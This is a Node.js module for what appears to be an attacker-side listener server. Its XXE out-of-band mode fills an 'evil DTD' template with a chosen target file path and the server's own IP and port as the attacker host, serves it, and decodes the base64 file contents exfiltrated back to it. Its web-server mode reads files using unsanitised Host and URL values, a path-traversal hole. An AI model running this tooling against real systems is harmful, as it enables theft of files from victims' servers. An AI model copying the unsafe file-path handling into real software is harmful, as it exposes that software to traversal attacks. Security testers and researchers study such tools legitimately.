const Logger = require('./logger.js')
const fs = require('fs');
const net = require('net');

const Types = {
    LISTENING_MODE: 'LISTENING_MODE',
    WEB_SERVER_MODE: 'WEB_SERVER_MODE',
    XXE_OOB_MODE: 'XXE_OOB_MODE'
};

let ListeningMode = {
    name: Types.LISTENING_MODE,
    execute: (pParsedRequest) => {
        Logger.logEntryToFile(pParsedRequest);
    }
};

let WebServerMode = {
    name: Types.WEB_SERVER_MODE,
    execute: (pParsedRequest) => {
        Logger.logEntryToFile(pParsedRequest);

        let htmlPageToReturn;

        try {
            if(net.isIP(pParsedRequest.headers.host) || pParsedRequest.headers.host.toLowerCase() === 'localhost'){
                htmlPageToReturn = fs.readFileSync(`${__dirname}/v-hosts/index.html`, 'utf8');
            }
    
            else if(!net.isIP(pParsedRequest.headers.host)) {
                if(pParsedRequest.headers.url === '/') {
                    htmlPageToReturn = fs.readFileSync(`${__dirname}/v-hosts/${pParsedRequest.headers.host}/index.html`, 'utf8');
                }
                else {
                    let destinationUrl = !pParsedRequest.headers.url.endsWith('.html') ?  `${pParsedRequest.headers.url}.html` : pParsedRequest.headers.url;
                    htmlPageToReturn = fs.readFileSync(`${__dirname}/v-hosts/${pParsedRequest.headers.host}${destinationUrl}`, 'utf8');
                }
            }
        } catch (error) {
            if(htmlPageToReturn === undefined){
                htmlPageToReturn = fs.readFileSync(`${__dirname}/v-hosts/404.html`, 'utf8');
            }
        }

        return htmlPageToReturn;
    }
}

let XXEOOBMode = {
    name: Types.XXE_OOB_MODE,
    execute: (pParsedRequest) => {
        Logger.logEntryToFile(pParsedRequest);

        console.log(pParsedRequest);

        if(pParsedRequest.data.query['resourceRead']) {
            const resourceRead = pParsedRequest.data.query['resourceRead'];

            console.log(`Resource read base64: \n ${resourceRead}\n`);

            console.log(`Decoded Resource read base64: \n\ ${new Buffer.from(resourceRead, 'base64').toString('utf-8')} \n`);

        }
        else if(pParsedRequest.data.query['fileToRead']) {
            const fileToRead = pParsedRequest.data.query['fileToRead'];
            const localAddress = pParsedRequest.connection.localAddress;
            const localPort = pParsedRequest.connection.localPort;

            let evilDTD = fs.readFileSync(`${__dirname}/XXE-OOB/evil_DTD.dtd`, 'utf8');
            evilDTD = evilDTD.replace("<FULL-ABSOLUTE-PATH-TO-FILE>", fileToRead);
            evilDTD = evilDTD.replace("<ATTACKER-IP>", localAddress);
            evilDTD = evilDTD.replace("<ATTACKER-PORT>", localPort);

            console.log(`Evil DTD`);
            console.log(evilDTD);
	        return evilDTD;
        }
    }
};

exports.Types = Types;
exports.ListeningMode = ListeningMode;
exports.WebServerMode = WebServerMode;
exports.XXEOOBMode = XXEOOBMode;